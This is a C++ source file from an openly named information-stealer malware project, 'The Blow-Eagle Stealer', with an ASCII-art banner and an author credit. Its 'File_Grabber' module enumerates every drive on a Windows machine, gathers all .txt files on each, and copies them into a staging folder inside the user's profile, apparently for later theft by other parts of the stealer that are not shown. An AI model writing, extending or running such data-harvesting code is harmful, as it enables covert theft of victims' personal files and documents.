/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../targets.h"
#include "../../config/config.c"
#include  "../../helper/helper.h"

std::string getFileNameWithoutExtension(const std::string& filePath);

void GetFiles(std::vector<std::string> volumes, std::vector<std::string> defaultPaths);

void GetVolumes(std::vector<std::string>& vector)
{
    DWORD drives = GetLogicalDrives();

    for (char drive = 'A'; drive <= 'Z'; drive++)
    {
        if (drives & 1)
        {
            std::string drivePath = std::string(1, drive) + ":\\";

            vector.push_back(drivePath);
        }

        drives >>= 1;
    }
}


void files::File_Grabber()
{
	printf("FG\n");

	std::string user = func::GetUser();

    std::vector<std::string> volumes;

    std::vector<std::string> defaultPaths =
    {
        "C:/Users/" + user + config::path + "/File_Grabber",
    };

    GetVolumes(volumes);

    for (const std::string& volume : volumes)
    {
        std::string volume1 = "Volum_" + volume.substr(0, std::size(volume) - 2);

        defaultPaths.push_back("C:/Users/" + user + config::path + "/File_Grabber/"+ volume1);
    }


	for (const std::string& path : defaultPaths)
	{
		int result = _mkdir(path.c_str());
	}

    GetFiles(volumes, defaultPaths);
}

void GetFiles(std::vector<std::string> volumes, std::vector<std::string> defaultPaths)
{
    printf("GetFiles\n");

    for (const std::string& volume : volumes)
    {
        std::string savePath = "";

        for (const std::string& path : defaultPaths)
        {
            if (path.find("Volum_"+ volume.substr(0, std::size(volume) - 2)) != std::string::npos)
            {
                savePath = path;
            }
        }

        std::vector<std::string> filePathsTXT;

        func::GetFilePaths(volume, filePathsTXT, ".txt");

        int counter = 0;
        for (const std::string& fileTxt : filePathsTXT)
        {
            func::copyFile(fileTxt, savePath + "/" + getFileNameWithoutExtension(fileTxt) + '_' + std::to_string(counter) + ".txt");
            counter++;
        }
    }
}